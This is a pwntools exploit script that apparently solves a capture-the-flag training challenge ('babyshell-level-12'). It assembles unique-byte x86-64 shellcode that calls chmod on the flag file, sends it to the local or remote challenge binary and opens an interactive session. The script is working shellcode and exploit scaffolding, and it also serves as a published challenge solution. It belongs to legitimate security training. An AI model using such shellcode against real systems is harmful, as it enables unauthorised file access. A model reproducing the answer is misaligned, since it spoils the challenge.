from pwn import *
from grwnapy.pwn import find_offset

# Allows you to switch between local/GDB/remote from terminal


def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

exe = './challenge/babyshell-level-12'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'info'

# ===========================================================
#                           EXPLOIT
# ===========================================================

# Lib-C library, can use pwninit/patchelf to patch binary
# libc = ELF("./libc.so.6")
# ld = ELF("./ld-2.27.so")

# offset = find_offset(exe, cyclic(500))
# win = elf.symbols['win']

# CHALLENGE DESC
# Write and execute shellcode to read the flag, but every byte in your input must be unique.
# Since our shellcode is already small, this challenge isnt too difficult


assembly = """
    push 0x67616c66
    push rsp
    pop rdi 
    xor rsi, rsi
    mov sil, 6
    push 90
    pop rax
    syscall
    """

# CHMOD with flag as path (not /flag)
# This means the python script needs to be run inside the '/' directory '/home/hacker'
# then in the workspace, cat flag

shellcode = asm(assembly)
print(shellcode)
print(len(shellcode))

io = start()

payload = flat([shellcode])

io.sendlineafter(b'', payload)
io.recvuntil(b'')

io.interactive()
